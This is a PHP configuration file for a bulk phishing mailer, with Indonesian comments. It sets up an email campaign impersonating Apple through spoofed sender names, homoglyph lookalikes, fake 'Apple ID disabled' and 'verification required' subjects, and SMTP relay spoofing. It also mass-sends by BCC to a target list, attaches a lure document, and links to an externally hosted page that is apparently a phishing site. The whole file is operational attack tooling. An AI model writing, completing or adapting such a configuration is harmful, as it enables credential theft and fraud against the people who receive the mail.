<?php
error_reporting(0);
$rand = rand(1,999999);

/*

   ██████╗ ███████╗████████╗██████╗ ██████╗
   ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
   ██████╔╝███████╗   ██║   ██████╔╝██║  ██║
   ██╔══██╗╚════██║   ██║   ██╔══██╗██║  ██║
   ██████╔╝███████║   ██║   ██║  ██║██████╔╝
   ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝

========Random (Letter | Subject)=================
[+] [randstring+]    = Uppercase random string
[+] [randstring-]    = Lowercase random string
[+] [randstring=]    = Mixcase random string
[+] [country]        = Random country
[+] [date]           = Random date
[+] [OS]             = Random OS
[+] [browser]        = Random Browser
[+] [number]         = Random Number
[+] [ip]             = Random IP
==============Random (From Mail)===================
[+] [randstring+]    = Uppercase random string
[+] [randstring-]    = Lowercase random string
[+] [randstring=]    = Mixcase random string
[+] [number]         = Random Number
[+] [default]        = Random 16 Digit String
===================================================

*/

$SENDER         = [ 'token'         => 'BSTRD-F0GOD-971B9-LO6UR',
                    'debug'         => 'yes',               // yes - Untuk melihat status sender secara details   | no - Untuk melihat total email yg terkirim
                    'custom_header' => 'no',               // yes - Untuk menggunakan Custom Header              | no - Jika Tidak menggunakan Custom Header
                    'spoofing'      => 'no',               // yes - Khusus SMTP External / smtp-relay.google.com | no - Jika Menggunakan smtp.gmail.com
                    'fm_generate'   => '[default]' ]; // From Mail yang digunakan pada saat generate user

$SMTP           = [ 'auto' => 'yes',                         // yes - Jika menggunakan auto generate SMTP User | no - Jika Membuat SMTP user secara Manual
                    'host' => 'smtp.gmail.com',             // Host SMTP
                    'port' =>  587,                         // Port SMTP 
                    'type' =>  'TLS',                       // Tulis Capital Semua
                    'user' => 'customer-[randstring-][number]@apple.email.com', // From Mail untuk spoofing, hiraukan jika menggunakan smtp.gmail.com
                    'pass' => '11111111', ];                // Pass Jangan Diganti Apabila Menggunakan Generate User

$USER_MANUAL    = [ '2dnl6lnthx8@nyrtey.com', ];       // Isi Jika Ingin Create User Relay Sendiri :D

$SEND           = [ 'type' => 'bcc',                        // bcc - Untuk Mode BCC | to - Untuk Mode TO
                    'to'   => 'customer@live.com',   // Isi Jika Menggunakan Mode BCC
                    'list' => 'list/list.txt' ];            // Letak List Klean

$MAIL           = [ 'type'      => 'letter',                              // null - Tanpa Letter | letter - HTML Letter
                    'from_name' => 'Apple Notice',            // Nama Pengirim Emailsupport@ɑpple.com Aррle
                    //'subject'   => 'Re : [Reminder] [Very Important] Your AppIe ID has been disable for security reason! [randstring+]', 
                   'subject'   => 'Re : [Alert] Verification account information required. June 16, 2019',
                   //'subject'   => 'Re : Your purchase has been confirmed',
                    'letter'    => 'letter/letter.html',                // Letak Letter Klean 
                    'use_pdf'   => 'no',                                  // yes - Jika Menggunakan Attachment | no - Jika Tidak menggunakan Attachment
                    'pdf'       => 'attachment/attachment.docx',                 // Letak Attachment Klean
                    'pdf_name'  => 'DOC-ID#'.$rand.'.docx',                // Nama Attachment Di Email
                    'short'     => 'https://suryapro.s3-ap-southeast-1.amazonaws.com/index?='.$rand, ]; // Taroh Shortlink disini (Khusus HTML Letter)

$TEST           = [ 'enabled'   => 'yes',                                 // yes - Jika ingin test email per 500 email send | no - Untuk menonaktifkan
                    'my_email'  => 'setangsuite11@hotmail.com' ];             // Ganti Emelmu euy jangan ke Emel Ku
                    
$CUST_HEADER    = array( "X-Priority:1",);
?>